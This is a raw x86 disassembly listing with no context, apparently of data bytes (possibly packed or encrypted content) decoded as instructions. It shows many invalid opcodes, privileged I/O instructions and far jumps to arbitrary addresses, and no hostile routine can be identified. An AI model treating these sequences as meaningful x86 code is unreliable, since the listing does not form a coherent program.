  403a73:	jne    0x403ae7
  403a75:	push   edi
	...
  403a82:	add    BYTE PTR [eax],al
  403a84:	add    BYTE PTR [edi+0x20],dl
  403a87:	sub    eax,edx
  403a89:	mov    edx,0x74d136cc
  403a8e:	jne    0x403acb
  403a90:	mov    ds:0x3e685d3,al
  403a95:	out    dx,eax
  403a96:	in     eax,dx
  403a97:	mov    ch,0x34
  403a99:	dec    ebx
  403a9a:	sub    BYTE PTR [edi],0x4
  403a9d:	arpl   WORD PTR [eax],ax
  403a9f:	sub    DWORD PTR [edi+0x64],edx
  403aa2:	sub    al,0xa2
  403aa4:	xor    DWORD PTR [edx],ebx
  403aa6:	(bad)  
  403aa7:	icebp  
  403aa8:	add    ebp,edx
  403aaa:	add    al,BYTE PTR [eax]
  403aac:	push   0x29
  403aae:	add    ebx,ebp
  403ab0:	pop    ss
  403ab1:	fild   WORD PTR ds:0x2c60e900
  403ab7:	pop    ebx
  403ab8:	aas    
  403ab9:	fadd   st,st(6)
  403abb:	or     cl,ch
  403abd:	dec    ebp
  403abe:	sub    ah,0x62
  403ac1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ac2:	std    
  403ac3:	or     ch,BYTE PTR [ecx+0x18002ac]
  403ac9:	addr16 push edx
  403acb:	or     DWORD PTR [ecx+0x60],esi
  403ace:	add    eax,0xc6a9e900
  403ad3:	add    al,0xe9
  403ad5:	inc    edi
  403ad6:	mov    bh,0xeb
  403ad8:	mul    al
  403ada:	or     al,0x5c
  403adc:	sbb    eax,0xbe38855c
  403ae1:	xor    eax,0x60e8ba04
  403ae6:	add    eax,0x9200
	...
  403af7:	add    BYTE PTR [ebp-0x71],ah
  403afa:	add    cl,ch
  403afc:	pusha  
  403afd:	add    eax,0x5586940
  403b02:	jne    0x403b51
  403b04:	daa    
  403b05:	(bad)  
  403b06:	leave  
  403b07:	sub    esp,DWORD PTR [ebp+eax*1+0x55]
  403b0b:	bound  esi,QWORD PTR [ebx+esi*1+0x420fba56]
  403b12:	or     al,0xec
  403b14:	pusha  
  403b15:	add    DWORD PTR [eax],eax
  403b17:	jmp    0x41911fcd
  403b1c:	scas   al,BYTE PTR es:[edi]
  403b1d:	sar    bh,1
  403b1f:	cs out dx,eax
  403b21:	int3   
  403b22:	mov    eax,DWORD PTR [ecx-0x19]
  403b25:	push   ecx
  403b26:	or     BYTE PTR [edx-0x63],dh
  403b29:	stc    
  403b2a:	jmp    0xb420:0xb3cfceb
  403b31:	add    BYTE PTR [eax+0x74c91c00],al
  403b37:	cmc    
  403b38:	xor    DWORD PTR [eax+0xfa60274],edx
  403b3e:	sub    eax,eax
  403b40:	mov    al,ds:0x1475c983
  403b45:	dec    edi
  403b46:	ret    
  403b47:	pop    ebx
  403b48:	pop    esp
  403b49:	sbb    cl,cl
  403b4b:	ret    0x702
  403b4e:	push   ebx
  403b4f:	push   esi
  403b50:	repz std 
  403b52:	(bad)  
  403b53:	(bad)  
  403b54:	cli    
  403b55:	push   esi
  403b56:	xor    edx,edx
  403b58:	call   0x0:0x90daf6
	...
  403b6b:	ficom  WORD PTR [ecx+0xf]
  403b6e:	mov    dh,0xba
  403b70:	push   ecx
  403b71:	cmp    al,0x2b
  403b73:	push   0x2c
  403b75:	push   es
  403b76:	nop
  403b77:	dec    ecx
  403b78:	(bad)  
  403b79:	ds nop
  403b7b:	mov    ebp,esi
  403b7d:	cs nop
  403b7f:	ja     0x403b84
  403b81:	nop
  403b82:	cmp    eax,0xfffffffa
  403b85:	pop    DWORD PTR [ebx-0x2]
  403b88:	test   BYTE PTR [edi+0x38fac07c],0x90
  403b8f:	mov    ebp,0xb90403fd
  403b94:	xchg   esi,eax
  403b95:	inc    ebx
  403b96:	cmp    al,0xcb
  403b98:	push   esi
  403b99:	jl     0x403ba6
  403b9b:	outs   dx,BYTE PTR ds:[esi]
  403b9c:	pop    ds
  403b9d:	nop
  403b9e:	jg     0x403b24
  403ba0:	jmp    0x3c43:0x96799040
  403ba7:	stos   DWORD PTR es:[edi],eax
  403ba8:	push   esi
  403ba9:	jl     0x403bb5
  403bab:	outs   dx,BYTE PTR ds:[esi]
  403bac:	cmp    al,0x90
  403bae:	jg     0x403b37
  403bb0:	jmp    0xc2c1:0x462a0346
  403bb7:	inc    esp
  403bb8:	in     al,0xb1
  403bba:	shl    DWORD PTR [ebx+0x26],0x6
  403bbe:	mov    esp,DWORD PTR [ecx]
  403bc0:	stos   DWORD PTR es:[edi],eax
  403bc1:	mov    ebx,0x3ad43bc1
  403bc6:	nop
  403bc7:	call   0x989eafe2
  403bcc:	pop    ds
  403bcd:	cmp    DWORD PTR [ebx+0x0],ecx
	...
  403bdb:	add    BYTE PTR [eax],al
  403bdd:	add    BYTE PTR [edi],bh
  403bdf:	outs   dx,DWORD PTR ds:[esi]
  403be0:	ss push esi
  403be2:	daa    
  403be3:	push   edi
  403be4:	pop    eax
  403be5:	or     bl,dh
  403be7:	push   esi
  403be8:	push   eax
  403be9:	adc    bl,dh
  403beb:	inc    ax
  403bed:	or     al,0xf3
  403bef:	out    dx,al
  403bf0:	stos   BYTE PTR es:[edi],al
  403bf1:	jecxz  0x403c34
  403bf3:	sub    al,0x34
  403bf5:	nop
  403bf6:	or     ecx,DWORD PTR [esi]
  403bf8:	iret   
  403bf9:	push   esp
  403bfb:	sub    ecx,DWORD PTR [eax-0x661b9237]
  403c01:	sar    ebx,0xd3
  403c04:	jae    0x403c49
  403c06:	shl    DWORD PTR [ebx+0x5ef35973],0xc5
  403c0d:	add    al,0xf3
  403c0f:	pop    esi
  403c10:	fadd   QWORD PTR [ebx+esi*8]
  403c13:	add    ch,BYTE PTR [esi+0x739ee890]
  403c19:	pop    esi
  403c1a:	adc    al,0xf7
  403c1c:	mov    esp,0x38dc5fc2
  403c21:	mov    esi,DWORD PTR [edi-0x621338a4]
  403c27:	sub    cl,dh
  403c29:	push   ebx
  403c2a:	dec    eax
  403c2b:	pop    ss
  403c2c:	add    BYTE PTR [ebp-0x71],0x8b
  403c30:	pop    ebx
  403c31:	inc    eax
  403c32:	cmp    bl,BYTE PTR [ebp+0x7136ff03]
  403c38:	sbb    al,0x41
  403c3a:	arpl   WORD PTR [esi+eiz*1-0x3a],ax
  403c3e:	arpl   sp,bx
  403c40:	cli    
  403c41:	mov    edi,0x0
	...
  403c4e:	add    BYTE PTR [eax],al
  403c50:	add    dh,ch
  403c52:	add    al,0xcb
  403c54:	into   
  403c55:	(bad)  
  403c56:	cmc    
  403c57:	sbb    eax,0xea5b6758
  403c5c:	pop    ecx
  403c5d:	arpl   ax,cx
  403c5f:	xchg   esp,eax
  403c60:	sti    
  403c61:	inc    ebp
  403c62:	push   ebx
  403c63:	add    eax,0xe9bf57db
  403c68:	add    ebp,DWORD PTR [eax-0x3b]
  403c6b:	jl     0x403c71
  403c6d:	mov    al,ds:0x3bcf74c8
  403c72:	fldcw  WORD PTR [esp+eax*1-0x23e039d]
  403c79:	ffreep st(2)
  403c7b:	jmp    0x64ba9f83
  403c80:	rol    DWORD PTR ds:0x8b34c6c9,1
  403c86:	add    eax,ebp
  403c88:	add    esp,DWORD PTR [ebx-0x23]
  403c8b:	xchg   ebx,eax
  403c8c:	enter  0x563,0xe2
  403c90:	ret    
  403c91:	push   esp
  403c92:	adc    DWORD PTR [ebp+0x4],0x7dc0563
  403c99:	bound  eax,QWORD PTR ds:0xa6e5fce9
  403c9f:	jmp    0xe99b9fa7
  403ca4:	jle    0x403c8c
  403ca6:	aam    0x7f
  403ca8:	int    0xb4
  403caa:	xor    eax,0x5a78d81
  403caf:	jmp    0x68151b32
  403cb4:	int    0x0
	...
  403cc2:	add    BYTE PTR [eax],al
  403cc4:	pushf  
  403cc5:	xor    eax,0xc8954451
  403cca:	push   esi
  403ccb:	stc    
  403ccc:	int3   
  403ccd:	push   edx
  403cce:	in     eax,dx
  403ccf:	pop    ebx
  403cd0:	popf   
  403cd1:	sbb    eax,0x82ee03a8
  403cd6:	cmp    cl,dh
  403cd8:	je     0x403ca2
  403cda:	add    BYTE PTR [ecx+0x2ef6ae88],bl
  403ce0:	xchg   esi,eax
  403ce1:	enter  0xf175,0x90
  403ce5:	frstor [esi+edx*1]
  403ce8:	es enter 0xe6eb,0x1f
  403ced:	push   edx
  403cee:	or     BYTE PTR [esp+ebx*8-0x2d],bl
  403cf2:	inc    BYTE PTR [esi]
  403cf4:	cs xor eax,0xc80d3ee8
  403cfa:	jmp    DWORD PTR [eax-0x1c]
  403cfd:	fdivr  st,st(6)
  403cff:	out    dx,al
  403d00:	pop    ss
  403d01:	pop    ebx
  403d02:	add    BYTE PTR [ebx+0x67],dl
  403d05:	pop    ebx
  403d06:	add    dl,BYTE PTR [ebx+0x5f]
  403d09:	pop    ebx
  403d0a:	add    eax,DWORD PTR [ecx+0x67]
  403d0d:	add    eax,0x9217a900
  403d12:	in     al,dx
  403d13:	(bad)  
  403d14:	das    
  403d15:	enter  0xcde8,0x23
  403d19:	add    eax,0xcda56000
  403d1e:	inc    eax
  403d1f:	xor    eax,0xf975c6f7
  403d24:	scas   eax,DWORD PTR es:[edi]
  403d25:	push   ecx
  403d26:	or     al,0x9e
	...
  403d34:	add    BYTE PTR [eax],al
  403d36:	add    BYTE PTR ds:0xaec7e8cd,ch
  403d3c:	(bad)  
  403d3d:	jmp    DWORD PTR [edx-0x8]
  403d40:	(bad)  
  403d41:	jne    0x403cc4
  403d43:	cwde   
  403d44:	stos   BYTE PTR es:[edi],al
  403d45:	ret    
  403d46:	jmp    0xfd1b39ab
  403d4b:	stos   DWORD PTR es:[edi],eax
  403d4c:	(bad)  
  403d4d:	mov    ch,0x7d
  403d4f:	xchg   esi,eax
  403d50:	(bad)  
  403d51:	call   DWORD PTR [ecx+0x6d]
  403d54:	rol    DWORD PTR [eax],0xe9
  403d57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d58:	xchg   ecx,eax
  403d59:	in     al,dx
  403d5a:	push   edi
  403d5b:	lahf   
  403d5c:	(bad)  
  403d5d:	call   0x7ef83
  403d62:	add    cl,dh
  403d64:	les    ebx,FWORD PTR [ebx-0x37]
  403d67:	dec    eax
  403d68:	enter  0x54ff,0x1
  403d6c:	test   al,0x81
  403d6e:	les    esp,FWORD PTR [esi]
  403d70:	mov    edx,0xba19ffff
  403d75:	jne    0x403d83
  403d77:	jne    0x403da8
  403d79:	or     BYTE PTR [eax-0x6],ch
  403d7c:	jmp    0x403dbe
  403d7e:	add    BYTE PTR [ebp-0x11],dl
  403d81:	push   esp
  403d82:	sub    DWORD PTR [ebx],ecx
  403d84:	add    ebp,eax
  403d86:	mov    ecx,0xbffbb2f
  403d8b:	jp     0x403d56
  403d8d:	test   dl,bl
  403d8f:	cmp    al,BYTE PTR [ebx]
  403d91:	add    BYTE PTR [ebx],ch
  403d93:	and    DWORD PTR [ebp-0x7b],ecx
  403d96:	out    dx,eax
  403d97:	xor    al,0xbb
  403d99:	call   DWORD PTR [eax+0x0]
	...
  403da8:	add    BYTE PTR [eax],al
  403daa:	mov    ds:0xfa000105,al
  403daf:	stos   BYTE PTR es:[edi],al
  403db0:	in     al,0xc3
  403db2:	or     al,BYTE PTR [ebx]
  403db4:	or     eax,eax
  403db6:	add    eax,0xfa00bd47
  403dbb:	add    bh,BYTE PTR ds:0x2fb04
  403dc1:	cmovge ebp,DWORD PTR [edi+0x0]
  403dc5:	add    dl,cl
  403dc7:	dec    ebp
  403dc8:	inc    ebp
  403dc9:	cld    
  403dca:	mov    ch,BYTE PTR [ecx-0x452a1646]
  403dd0:	lea    eax,[ebp-0x442b]
  403dd6:	pop    edx
  403dd7:	test   eax,0xba35fd4f
  403ddc:	or     eax,eax
  403dde:	scas   eax,DWORD PTR es:[edi]
  403ddf:	fisub  WORD PTR [edi-0x3a]
  403de2:	jb     0x403e24
  403de4:	add    BYTE PTR [ebp-0x15601],cl
  403dea:	arpl   WORD PTR [edi],bp
  403dec:	xor    al,0xe8
  403dee:	jnp    0x403e21
  403df0:	retf   
  403df1:	(bad)  
  403df2:	jl     0x403d7d
  403df4:	sti    
  403df5:	dec    edi
  403df6:	mov    ecx,ebx
  403df8:	sar    edi,1
  403dfa:	ins    BYTE PTR es:[edi],dx
  403dfb:	inc    ebx
  403dfc:	sti    
  403dfd:	(bad)  
  403dfe:	out    dx,al
  403dff:	jecxz  0x403e79
  403e01:	test   DWORD PTR [esi+ebx*1-0x35],ecx
  403e05:	push   DWORD PTR [ebx+0x4cf5b9f4]
  403e0b:	out    dx,eax
  403e0c:	xor    edi,edi
	...
  403e1a:	add    BYTE PTR [eax],al
  403e1c:	add    dh,cl
  403e1e:	clc    
  403e1f:	xor    ebp,eax
  403e21:	(bad)
  403e24:	jmp    FWORD PTR [eax+0x1c]
  403e27:	push   eax
  403e28:	push   ebx
  403e29:	sub    al,0x49
  403e2b:	(bad)  
  403e2c:	call   0xb4335
  403e31:	jmp    0x3e4:0x9683cc18
  403e38:	je     0x403ddb
  403e3a:	popa   
  403e3b:	inc    eax
  403e3c:	hlt    
  403e3d:	mov    bl,0xb7
  403e3f:	push   eax
  403e40:	cld    
  403e41:	or     ebp,esi
  403e43:	mov    edi,0xc3616300
  403e48:	js     0x403e7b
  403e4a:	(bad)  
  403e4b:	push   eax
  403e4c:	hlt    
  403e4d:	sti    
  403e4e:	fld    st(6)
  403e50:	add    BYTE PTR [ebx-0x2d],ah
  403e53:	ret    
  403e54:	je     0x403ed3
  403e56:	or     al,0xcb
  403e58:	jne    0x403e25
  403e5a:	add    DWORD PTR ds:0x7e76c4f2,0xffffffd8
  403e61:	sbb    edi,DWORD PTR [edi+0x50]
  403e64:	clc    
  403e65:	adc    ah,ch
  403e67:	fld    TBYTE PTR [ecx+esi*4]
  403e6a:	dec    esi
  403e6b:	retf   0x2eff
  403e6e:	push   eax
  403e6f:	(bad)  
  403e71:	mov    eax,ds:0xe803e904
  403e76:	aas    
  403e77:	in     eax,dx
  403e78:	retf   0xcd16
  403e7b:	add    di,WORD PTR [ebx-0x45]
  403e7f:	pop    eax
  403e80:	retf   0x0
	...
  403e8f:	add    BYTE PTR [ebp+eax*8-0x44],bh
  403e93:	(bad)  
  403e94:	mov    edx,DWORD PTR [esi]
  403e96:	push   eax
  403e97:	retf   0x796c
  403e9a:	sub    ch,BYTE PTR [esi]
  403e9c:	call   0x1590:0xb603e1c2
  403ea3:	xor    ch,al
  403ea5:	inc    edx
  403ea6:	icebp  
  403ea7:	fidiv  WORD PTR [edx+0x5c]
  403eaa:	add    al,BYTE PTR [ecx]
  403eac:	(bad)  [eax+ebp*8+0x7b]
  403eb0:	fs dec esp
  403eb2:	imul   ecx,DWORD PTR [edx],0x29f43a63
  403eb8:	pushf  
  403eb9:	dec    esp
  403eba:	imul   ecx,DWORD PTR [edx],0x83033983
  403ec0:	pop    esp
  403ec1:	adc    bl,BYTE PTR [ebp-0x21]
  403ec4:	jecxz  0x403eca
  403ec6:	repz dec edi
  403ec8:	add    eax,DWORD PTR [esi-0x1f6f04ea]
  403ece:	bound  eax,QWORD PTR [edi+0x6b]
  403ed1:	les    edi,FWORD PTR [esp+edi*8]
  403ed4:	cld    
  403ed5:	mov    ch,BYTE PTR [ebx-0x4e779cfc]
  403edb:	add    al,0x6d
  403edd:	in     al,dx
  403ede:	push   0xc9c49b48
  403ee3:	dec    edi
  403ee4:	outs   dx,BYTE PTR ds:[esi]
  403ee5:	test   DWORD PTR ds:0x1d12cc0c,ebx
  403eeb:	cli    
  403eec:	inc    esp
  403eed:	inc    ecx
  403eee:	ror    eax,1
  403ef0:	imul   edi,DWORD PTR [ecx],0x83ee
	...
  403f02:	add    BYTE PTR [edi],dh
  403f04:	std    
  403f05:	jge    0x403f02
  403f07:	aaa    
  403f08:	or     al,0x0
  403f0a:	scas   eax,DWORD PTR es:[edi]
  403f0b:	and    edi,ebp
  403f0d:	(bad)  
  403f0e:	jmp    0xec2b46d2
  403f13:	mov    bh,0xd1
  403f15:	pop    edi
  403f16:	xor    BYTE PTR [ebp+0x7bc0009],ah
  403f1c:	mov    cl,0x83
  403f1e:	and    eax,0x4835883
  403f23:	mov    ?,ebx
  403f25:	inc    eax
  403f26:	jmp    0x6a52788b
  403f2b:	pop    esp
  403f2c:	mov    esp,0x560a82e
  403f31:	je     0x403f23
  403f33:	fild   WORD PTR [ecx]
  403f35:	(bad)  
  403f37:	mov    eax,ds:0x639c0005
  403f3c:	lock mov edi,0x8c6f9b2
  403f42:	jmp    0xa5081f9e
  403f47:	sbb    al,0x5
  403f49:	add    cl,ch
  403f4b:	pusha  
  403f4c:	xchg   edx,eax
  403f4d:	inc    ebp
  403f4e:	icebp  
  403f4f:	push   eax
  403f50:	les    esi,FWORD PTR [ebp-0xf]
  403f53:	mov    dh,0x5
  403f55:	push   esp
  403f57:	aaa    
  403f58:	repz inc eax
  403f5a:	jmp    0x32b4c366
  403f5f:	pop    ds
  403f60:	cmp    eax,edx
  403f62:	jmp    0x6d10cfc7
	...
  403f73:	add    BYTE PTR [eax],al
  403f75:	add    BYTE PTR ds:0x3f4350b9,ch
  403f7b:	push   edi
  403f7c:	call   esp
  403f7e:	or     esi,ebx
  403f80:	inc    eax
  403f81:	jmp    0xd0b4c35d
  403f86:	mov    ds:0x60e8e449,eax
  403f8b:	add    eax,0xbd2d8e00
  403f90:	pop    DWORD PTR [eax]
  403f92:	xchg   ecx,esp
  403f94:	push   DWORD PTR [ebp+0x2e]
  403f97:	cmp    eax,0x4b39ec45
  403f9c:	or     al,0x0
  403f9e:	xchg   esi,eax
  403f9f:	mov    esi,0xa3a45c6
  403fa4:	add    BYTE PTR [eax],al
  403fa6:	jp     0x403f88
  403fa8:	pop    es
  403fa9:	(bad)  
  403faa:	mov    bh,0xd7
  403fac:	add    BYTE PTR [eax],al
  403fae:	mov    al,BYTE PTR [edi]
  403fb0:	push   0x0
  403fb2:	nop
  403fb3:	pop    es
  403fb4:	push   0x10
  403fb6:	inc    DWORD PTR [edx]
  403fb8:	in     al,0x50
  403fba:	mov    al,ds:0x9675ff07
  403fbf:	int    0x15
  403fc1:	imul   DWORD PTR [eax+ecx*2]
  403fc4:	add    BYTE PTR [ebx],cl
  403fc6:	jp     0x40401a
  403fc8:	add    DWORD PTR [ebx-0x47],eax
  403fcb:	dec    ebx
  403fcc:	hlt    
  403fcd:	add    dh,dl
  403fcf:	mov    esi,0xe03675fe
  403fd4:	call   0xc3:0x8b073ac1
	...
  403fe7:	add    BYTE PTR [eax],al
  403fe9:	sar    DWORD PTR [edi-0x3e],1
  403fec:	or     BYTE PTR [edx],cl
  403fee:	hlt    
  403fef:	mov    ch,ah
  403ff1:	std    
  403ff2:	push   esp
  403ff3:	or     al,ch
  403ff5:	xchg   esi,eax
  403ff6:	enter  0x0,0x3a
  403ffa:	stc    
  403ffb:	out    0xa0,eax
  403ffd:	sbb    cl,bl
  403fff:	call   DWORD PTR [eax+0x1d]
  404002:	push   ebp
  404003:	or     BYTE PTR [eax+0x12],dl
  404006:	imul   eax,ecx,0xc8eefa00
  40400c:	ret    0x6c6
  40400f:	push   ebp
  404010:	mov    ebp,esi
  404012:	xchg   ah,al
  404014:	cld    
  404015:	mov    DWORD PTR [esi-0x539cf783],eax
  40401b:	push   eax
  40401c:	pop    es
  40401d:	mov    BYTE PTR [ebx+ebp*1-0x37],ch
  404021:	mov    eax,ds:0x882b03b0
  404026:	push   ss
  404027:	add    al,0x6a
  404029:	arpl   WORD PTR [esi],ax
  40402b:	add    al,0x6a
  40402d:	arpl   WORD PTR [esi],ax
  40402f:	(bad)  
  404030:	dec    DWORD PTR [esi]
  404032:	mov    ah,0x59
  404034:	add    cl,bh
  404036:	stos   DWORD PTR es:[edi],eax
  404037:	fcmovnb st,st(4)
  404039:	mov    ds:0xa30b03ac,al
  40403e:	fcom   DWORD PTR [edx]
  404040:	mov    DWORD PTR [esi],ebx
  404042:	dec    eax
  404043:	(bad)  
  404044:	jne    0x4040b5
  404046:	push   esp
  404047:	cs lock fs sti 
  40404b:	cli    
  40404c:	mov    edi,0x0
	...
  404059:	add    BYTE PTR [eax],al
  40405b:	add    bh,dl
  40405d:	or     BYTE PTR [ebx-0x28],bh
  404060:	leave  
  404061:	lods   al,BYTE PTR ds:[esi]
  404062:	pop    ecx
  404063:	add    BYTE PTR [ecx+ebx*4-0x39],cl
  404067:	push   ebx
  404068:	mov    ecx,0x6b75c71b
  40406d:	xchg   BYTE PTR [ebx],al
  40406f:	push   0x63
  404071:	adc    al,0x6d
  404073:	shl    DWORD PTR [ebx-0x54],0xfa
  404077:	mov    edi,0xe832a4ae
  40407c:	jp     0x40403a
  40407e:	(bad)  
  40407f:	dec    DWORD PTR [eax-0x39]
  404082:	jp     0x404047
  404084:	test   al,0x75
  404086:	rol    DWORD PTR [ebx+eiz*2],0x1
  40408a:	jnp    0x404078
  40408c:	loopne 0x4040f5
  40408e:	xlat   BYTE PTR ds:[ebx]
  40408f:	push   eax
  404090:	nop
  404091:	sbb    eax,0x37955732
  404096:	inc    eax
  404097:	or     al,0xd6
  404099:	and    eax,DWORD PTR [ebx+0x78ac6300]
  40409f:	adc    al,0x9e
  4040a1:	add    al,0xe9
  4040a3:	add    esp,DWORD PTR [ebx+0x5]
  4040a6:	jb     0x404053
  4040a8:	fmul   st,st(4)
  4040aa:	test   al,0xdb
  4040ac:	mov    WORD PTR gs:[eax+ebx*8],fs
  4040b0:	call   0xaa4331f4
  4040b5:	retf   0x83e6
  4040b8:	loopne 0x40405f
  4040ba:	mov    dh,0x1a
  4040bc:	cwde   
  4040bd:	test   DWORD PTR [edx+0xb],esi
	...
  4040cc:	add    BYTE PTR [eax],al
  4040ce:	add    BYTE PTR [ecx],dl
  4040d0:	adc    ebp,edx
  4040d2:	retf   0x44cb
  4040d5:	jmp    0x2a2ea3dd
  4040da:	add    bh,BYTE PTR [ebx-0x3f]
  4040dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040de:	xlat   BYTE PTR ds:[ebx]
  4040df:	jmp    0x26b4:0xf6790159
  4040e6:	std    
  4040e7:	arpl   si,sp
  4040e9:	stos   DWORD PTR es:[edi],eax
  4040ea:	pop    esi
  4040eb:	and    al,0x48
  4040ed:	in     eax,0x7c
  4040ef:	or     bl,dl
  4040f1:	push   ss
  4040f2:	mov    esi,0xa71f0da5
  4040f7:	or     DWORD PTR [esi+0x376f3d2e],ebx
  4040fd:	mov    ch,0x11
  4040ff:	push   ebx
  404100:	sar    BYTE PTR [edi+edx*8+0x2c],0x3b
  404105:	icebp  
  404106:	js     0x4040a6
  404108:	mov    ch,0x99
  40410a:	(bad)  [esi+0x5]
  40410d:	jmp    0xedbf5815
  404112:	add    esp,DWORD PTR [ebx+0x5]
  404115:	jb     0x40415e
  404117:	jae    0x4040cd
  404119:	mov    WORD PTR [esi],fs
  40411b:	pushf  
  40411c:	pop    ebx
  40411d:	xor    BYTE PTR [ecx],ch
  40411f:	fwait
  404120:	into   
  404121:	stos   DWORD PTR es:[edi],eax
  404122:	clc    
  404123:	in     al,dx
  404124:	pop    ecx
  404125:	jb     0x4040ff
  404127:	loopne 0x4040f2
  404129:	add    BYTE PTR [ebp+0x1a50588d],dh
  40412f:	nop
  404130:	push   ebx
  404131:	mov    ebx,DWORD PTR [eax+eax*1]
	...
  404140:	add    BYTE PTR [eax],al
  404142:	retf   
  404143:	mov    edi,DWORD PTR [ebp-0xf]
  404146:	dec    ebx
  404147:	dec    edx
  404148:	adc    BYTE PTR [eax+0x7c],ah
  40414b:	ror    DWORD PTR [ebx+0x4603be6],0x72
  404152:	jbe    0x404161
  404154:	mov    edx,DWORD PTR [esi]
  404156:	stos   DWORD PTR es:[edi],eax
  404157:	mov    edi,ecx
  404159:	mov    edx,0xbafae4aa
  40415e:	stos   BYTE PTR es:[edi],al
  40415f:	xchg   edx,eax
  404160:	test   dh,ch
  404162:	sbb    BYTE PTR [ecx+0x6a],ch
  404165:	bound  eax,QWORD PTR ss:[edi]
  404168:	shr    DWORD PTR [ecx],0x7e
  40416b:	add    eax,ebx
  40416d:	bound  ebp,QWORD PTR [edx-0x60f5070c]
  404173:	hlt    
  404174:	clc    
  404175:	ins    BYTE PTR es:[edi],dx
  404176:	repz pop ss
  404178:	push   esi
  404179:	jle    0x404199
  40417b:	lods   eax,DWORD PTR ds:[esi]
  40417c:	add    edx,DWORD PTR [edi-0xa3d3aac]
  404182:	arpl   bp,dx
  404184:	mov    esp,DWORD PTR [ecx]
  404186:	jb     0x404144
  404188:	and    edx,DWORD PTR [ebx]
  40418a:	push   edx
  40418b:	mov    esp,0xdb2e5d8d
  404190:	jo     0x40415b
  404192:	dec    esp
  404193:	add    al,0x4e
  404195:	icebp  
  404196:	and    esi,eax
  404198:	adc    edx,ebp
  40419a:	fimul  DWORD PTR [ebx-0x1bd74506]
  4041a0:	clc    
  4041a1:	sbb    bl,BYTE PTR [edi]
  4041a3:	xchg   edx,eax
  4041a4:	pushf  
  4041a5:	inc    BYTE PTR [eax]
	...
  4041b3:	add    BYTE PTR [eax],al
  4041b5:	cs iret 
  4041b7:	mov    ebp,0xc5f63a8
  4041bc:	test   al,0x23
  4041be:	pop    ss
  4041bf:	add    eax,DWORD PTR [eax]
  4041c1:	ret    
  4041c2:	cmp    al,0xf9
  4041c4:	xor    esp,DWORD PTR [eax]
  4041c6:	in     eax,0xfa
  4041c8:	xor    edx,DWORD PTR [eax]
  4041ca:	aaa    
  4041cb:	test   BYTE PTR [edi],al
  4041cd:	push   ebp
  4041ce:	mov    ecx,0x1b9f57b
  4041d3:	adc    cl,al
  4041d5:	cli    
  4041d6:	rol    BYTE PTR [edx],0xc3
  4041d9:	inc    ecx
  4041da:	int    0x33
  4041dc:	stc    
  4041dd:	test   eax,0x37f933cb
  4041e2:	xor    BYTE PTR [edi],dl
  4041e4:	sub    bh,ah
  4041e6:	inc    eax
  4041e7:	inc    edi
  4041e8:	add    edi,DWORD PTR [ebp+esi*4-0x40]
  4041ec:	ret    0x4b6
  4041ef:	ror    BYTE PTR [ebx+0x23fb1502],1
  4041f5:	add    BYTE PTR ds:0xb9068dfb,dl
  4041fb:	adc    al,BYTE PTR [esi+0x5a]
  4041fe:	mov    eax,ds:0xc2824e03
  404203:	rcl    DWORD PTR [ecx],0x79
  404206:	jge    0x404193
  404208:	cli    
  404209:	pop    ecx
  40420a:	retf   
  40420b:	and    edi,ecx
  40420d:	pop    ecx
  40420e:	retf   
  40420f:	lea    ebx,[ebp+eiz*2+0x67469502]
  404216:	add    eax,0x1c5e
	...
  404227:	add    BYTE PTR [ebx+0x730316c5],cl
  40422d:	cmp    eax,0xe56033f9
  404232:	cli    
  404233:	xor    esp,DWORD PTR [eax+0x37]
  404236:	test   BYTE PTR [edi],al
  404238:	jb     0x404264
  40423a:	sub    BYTE PTR [ecx+0x9],0x1
  40423e:	and    cl,al
  404240:	mov    edx,0x91c3030a
  404245:	jle    0x40427a
  404247:	stc    
  404248:	arpl   WORD PTR [ebx],cx
  40424a:	mov    esp,0x9861fa33
  40424f:	pop    ss
  404250:	mov    esp,0x608b487f
  404255:	push   ss
  404256:	call   0x6e8e41b
  40425b:	shr    al,1
  40425d:	je     0x404256
  40425f:	cli    
  404260:	and    BYTE PTR [edx-0x9],0xfa
  404264:	(bad)  
  404265:	xor    BYTE PTR [ebx],dl
  404267:	mov    cl,0x18
  404269:	xchg   edi,eax
  40426a:	ret    
  40426b:	add    esp,DWORD PTR ds:0x52c1c4c4
  404271:	stos   DWORD PTR es:[edi],eax
  404272:	int    0x8b
  404274:	test   eax,0x9a23bb7b
  404279:	jnp    0x404236
  40427b:	(bad)  
  40427c:	test   edi,0x352fd781
  404282:	pop    es
  404283:	pop    esi
  404284:	aaa    
  404285:	in     eax,dx
  404286:	(bad)  
  404287:	push   ss
  404288:	pusha  
  404289:	cmc    
  40428a:	mov    ?,ecx
	...
  404298:	add    BYTE PTR [eax],al
  40429a:	add    BYTE PTR [eax],dh
  40429c:	push   edx
  40429d:	out    0xfa,eax
  40429f:	xor    BYTE PTR [edx-0x6f],al
  4042a2:	test   BYTE PTR [edx+ecx*1+0x15],bl
  4042a6:	nop
  4042a7:	enter  0x49ab,0x30
  4042ab:	and    ch,ah
  4042ad:	or     al,BYTE PTR [ebx]
  4042af:	and    BYTE PTR [ebx],dh
  4042b1:	mov    edi,0xbbcb4a33
  4042b6:	xor    edi,DWORD PTR [edx]
  4042b8:	sub    DWORD PTR [eax-0x64632fe9],ebx
  4042be:	std    
  4042bf:	pusha  
  4042c0:	sahf   
  4042c1:	test   eax,0xd006b021
  4042c7:	call   0x413b397f
  4042cc:	mov    dl,0xf6
  4042ce:	cli    
  4042cf:	fiadd  WORD PTR [esi*2+0x6041d512]
  4042d6:	push   0x60
  4042d8:	dec    edi
  4042d9:	adc    ebp,eax
  4042db:	and    dl,BYTE PTR [edx+ebp*8]
  4042de:	int    0xd8
  4042e0:	mov    edx,0xbc40bbfa
  4042e5:	cli    
  4042e6:	mov    ebx,0xe4d6a0ee
  4042eb:	pop    esp
  4042ec:	jns    0x40430e
  4042ee:	pop    es
  4042ef:	sub    eax,0x6dc6a801
  4042f4:	add    al,al
  4042f6:	mov    ?,WORD PTR [edx-0x45196e0f]
  4042fc:	icebp  
  4042fd:	(bad)  
  4042fe:	nop
	...
  40430b:	add    BYTE PTR [eax],al
  40430d:	add    bh,ah
  40430f:	add    eax,0xb746e90b
  404314:	jmp    0x6008:0xa9c46749
  40431b:	ret    0xbe62
  40431e:	push   eax
  40431f:	mov    ebp,0xba50bd0a
  404324:	ins    BYTE PTR es:[edi],dx
  404325:	xchg   edi,eax
  404326:	push   esp
  404327:	inc    ebp
  404328:	call   0xa21b:0xb701a343
  40432f:	ret    0x6f0
